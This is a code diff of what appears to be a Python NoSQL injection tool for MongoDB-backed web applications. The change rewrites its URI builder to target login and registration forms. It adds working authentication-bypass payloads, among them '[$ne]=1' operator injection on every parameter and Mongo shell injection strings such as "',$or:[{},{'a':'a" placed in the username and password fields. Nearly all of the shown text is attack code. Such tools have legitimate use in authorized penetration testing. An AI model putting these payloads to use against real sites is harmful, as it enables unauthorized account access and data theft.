@@ -5,7 +5,7 @@ no_tag = ['n','N']
 def buildAttackUri(origUri, randValue):
     attackSum = 19
     attackEffectiveSum = 10
-    attackEffectiveSum_for_injectParameters = 1
+    attackEffectiveSum_for_usernameAndPassword = 3
     attackSet=["","","","","","","","","","","","","","","","","","",""]
     attackSet[0] = "=" + randValue + "&"#normal uri which be used to test the length of response
     attackSet[1] = "[$ne]=" + randValue + "&"
@@ -52,7 +52,7 @@ def buildAttackUri(origUri, randValue):
         print str(menuItem) + "-" + params
         menuItem += 1
     try:
-        optionParameter = raw_input("Inject all parameters?(Y/N)")
+        optionParameter = raw_input("Inject for username and password?(Y/N)")
     except:
         raw_input("Something went wrong.  Press enter to return to the main menu...")
         return
@@ -99,17 +99,25 @@ def buildAttackUri(origUri, randValue):
         indexParamName = 0
         sumParamName = len(paramNames)
 
-        for index in range(0, attackEffectiveSum_for_injectParameters):
-            for indexParamName in range(0, sumParamName):
-                if indexParamName != sumParamName-1:
-                    uriArray[index] += paramNames[indexParamName] + "[$ne]=1" + "&"
-                else:
-                    uriArray[index] += paramNames[indexParamName] + "[$ne]=1"
+        for index in range(0, attackEffectiveSum_for_usernameAndPassword):
+            if index == 0:
+                for indexParamName in range(0, sumParamName):
+                    if indexParamName != sumParamName-1:
+                        uriArray[index] += paramNames[indexParamName] + "[$ne]=1" + "&"
+                    else:
+                        uriArray[index] += paramNames[indexParamName] + "[$ne]=1"
+            if index == 1:
+                uriArray[index] += paramNames[0] + "=" + paramValue[0] + "',$or:[{},{'a':'a " + "&"
+                uriArray[index] += paramNames[1] + "=" + "'}],$comment:'successful MongoDB"
+            if index == 2:
+                uriArray[index] += paramNames[0] + "=" + paramValue[0] + "&"
+                uriArray[index] += paramNames[1] + "=" + paramValue[1]+ "','injection':'injection"
 #        for index in range(0, attackSum):
 #            uriArray[index] = uriArray[index][:-1] # delete the last "&" of URI
-        attackDescriptionSet[0] = attackEffectiveSum_for_injectParameters
-        attackDescriptionSet[1] = "Testing Mongo PHP array injection for all parameters...\n" + "Injecting " + \
-                 uriArray[1]
+        attackDescriptionSet[0] = attackEffectiveSum_for_usernameAndPassword
+        attackDescriptionSet[1] = "Testing Mongo PHP array injection for login...\n"
+        attackDescriptionSet[2] = "Testing Mongo shell injection for login...\n"
+        attackDescriptionSet[3] = "Testing Mongo shell injection for register...\n"
         buildAttackSet = [[], []]
         buildAttackSet[0] = uriArray
         buildAttackSet[1] = attackDescriptionSet;
